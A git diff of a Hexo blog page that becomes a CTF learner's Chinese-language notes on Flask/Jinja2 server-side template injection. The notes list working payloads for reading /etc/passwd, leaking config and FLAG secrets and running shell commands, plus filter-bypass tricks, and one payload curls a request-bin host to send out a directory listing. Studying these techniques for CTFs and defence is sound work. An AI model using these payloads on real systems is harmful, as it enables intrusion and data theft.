@@ -6,16 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://Ethe448.github.io">
-  <title>Archives: 2021 | Ethe&#39;s blog</title>
+  <title>ssti模板注入 | Ethe&#39;s blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Ethe&#39;s blog">
-<meta property="og:url" content="https://ethe448.github.io/archives/2021/index.html">
+  <meta name="description" content="不会python看的我好懵，一些类和魔术变量的部分都不是太懂。。。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssti模板注入">
+<meta property="og:url" content="https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Ethe&#39;s blog">
+<meta property="og:description" content="不会python看的我好懵，一些类和魔术变量的部分都不是太懂。。。。">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-06-25T04:19:20.000Z">
+<meta property="article:modified_time" content="2021-06-25T08:47:04.666Z">
 <meta property="article:author" content="Ethe">
+<meta property="article:tag" content="ssti - web学习">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Ethe&#39;s blog" type="application/atom+xml">
@@ -201,41 +206,256 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-ssti模板注入" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-        <time datetime="2021-06-25T04:19:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-25</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">ssti模板注入</a>
-	
+    <h1 class="article-title" itemprop="name">
+      ssti模板注入
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+        <time datetime="2021-06-25T04:19:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-25</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.4k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">6分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <!-- 目录内容 -->
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+  <div id="toc-article" class="toc-article">
+      <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+    <strong class="toc-title">文章目录</strong>
+           
+         </div>
+   <script type="text/javascript">
+  function showToc(){
+    var toc_article = document.getElementById("toc-article");
+    var show_toc_btn = document.getElementById("show-toc-btn");
+    toc_article.setAttribute("style","display:block");
+    show_toc_btn.setAttribute("style","display:none");
+    };
+  function showBtn(){
+    var toc_article = document.getElementById("toc-article");
+    var show_toc_btn = document.getElementById("show-toc-btn");
+    toc_article.setAttribute("style","display:none");
+    show_toc_btn.setAttribute("style","display:block");
+    };
+   </script>
+      
+<!-- 目录内容结束 -->
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>不会python看的我好懵，一些类和魔术变量的部分都不是太懂。。。。</p>
+ <span id="more"></span>
+
+<p>贴个大佬的文章</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)</a></p>
+<pre><code>SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；
+漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，&#123;&#123;&#125;&#125;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#123;&#123;&#125;&#125;包裹的内容当做变量解析替换。比如&#123;&#123;1+1&#125;&#125;会被解析成2。
+</code></pre>
+<p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__dict__ 保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</span><br></pre></td></tr></table></figure>
+
+<p><strong>流程：</strong></p>
+<ol>
+<li><p>​    获取基本类</p>
+</li>
+<li><p>​    获取基本类的子类</p>
+</li>
+<li><p>​    找到重载过的<code>__init__</code>类</p>
+</li>
+<li><p>​    查看其引用<code>__builtins__</code></p>
+</li>
+<li><p>​    调用其中可用的函数</p>
+</li>
+</ol>
+<p><strong>获取基本类</strong></p>
+<p>​        利用<code>__bases__</code>或者是<code>__mro__</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2] </span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用</span><br></pre></td></tr></table></figure>
+
+<p>//实话实说最后一个不是很懂</p>
+<p><strong>获取基本类的子类</strong></p>
+<p>​    利用<code>__subclasses__</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p><strong>找到重载过的<code>__init__</code>类</strong></p>
+<p>​    不带warpper的说明重载过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__</span><br><span class="line">&lt;unbound method WarningMessage.__init__</span><br></pre></td></tr></table></figure>
+
+<p> <strong>查看其引用<code>__builtins__</code></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p><strong>调用其中的函数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件读取</span><br><span class="line"># python3</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;cat /fl4g|base64&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># python2</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>来、姿势</strong></p>
+<p><strong>1、config</strong></p>
+<p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前</p>
+<p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p>
+<p><strong>2、self</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、””、[]、()等数据结构</strong></p>
+<p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br><code>&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;</code></p>
+<p><strong>4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</strong></p>
+<p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#x27;json&#x27;].JSONEncoder.default.__globals__[&#x27;current_app&#x27;].config[&#x27;F</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>常见的过滤绕过</strong></p>
+<p><strong>(1)只过滤<code>[]</code></strong></p>
+<blockquote>
+<p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br><code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code><br>若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code><br>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></p>
+</blockquote>
+<p><strong>(2)过滤_</strong></p>
+<p>利用<code>request.args</code>属性<br><code>&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code><br>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p>
+<p><strong>(3)关键字过滤</strong></p>
+<ul>
+<li>base64编码绕过<br><code>__getattribute__</code>使用实例访问属性时,调用该方法</li>
+</ul>
+<p>例如被过滤掉<code>__class__</code>关键词<br><code>&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></p>
+<ul>
+<li>字符串拼接绕过<br><code>&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code><br><code>&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125;</code></li>
+</ul>
+<p><strong>(4)过滤{ {</strong></p>
+<p>使用<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;&#x27;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/test&#x27;).read()[0:1]==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(5)引号内十六进制绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;]&#125;&#125;</span><br><span class="line">_`是`\x5f`，`.`是`\x2E</span><br></pre></td></tr></table></figure>
+
+<p><strong>(6)” ‘ chr等被过滤，无法引入字符串</strong></p>
+<ul>
+<li>直接拼接键名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict(buil=aa,tins=dd)|join()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(app.__doc__|list()).pop(102)|string()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set udl=dict(a=pc,c=c).values()|join %&#125;      # uld=%c</span><br><span class="line">&#123;%set i1=dict(a=i1,c=udl%(99)).values()|join %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(7)+等被过滤，无法拼接字符串</strong></p>
+<ul>
+<li><code>~</code><br>在jinja中可以拼接字符串</li>
+<li>格式化字符串<br>同上</li>
+</ul>
+<p>先稍微写一下吧，不懂的地方好多，以后再补充，先去学python了(</p>
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/alipay.jpg">
+                    <span class="reward-type">支付宝</span>
+                  </div>
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/weixin.png">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
+        </div>
+      </a>
+    </div>
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Ethe
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://Ethe448.github.io/2021/06/25/ssti模板注入/" title="ssti模板注入" target="_blank">https://Ethe448.github.io/2021/06/25/ssti模板注入/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -247,156 +467,120 @@
 		</ul>
 	</div>
 
-          
+    
 
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-        <time datetime="2021-06-16T20:26:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-17</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">buu刷题记录</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">buu刷题记录</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    目录，不存在的…
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/06/16/buu-sql%E9%A2%98wp/" class="archive-article-date">
-        <time datetime="2021-06-16T08:30:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-16</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/06/16/buu-sql%E9%A2%98wp/">sql题wp</a>
-	
-    </h1>
-  
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web学习</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/06/15/my-first-blog/" class="archive-article-date">
-        <time datetime="2021-06-14T16:32:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-15</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/06/15/my-first-blog/">my-first-blog</a>
-	
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">test</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
 
-    
+
+
+
+
+
 
 
           </div>
@@ -437,8 +621,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
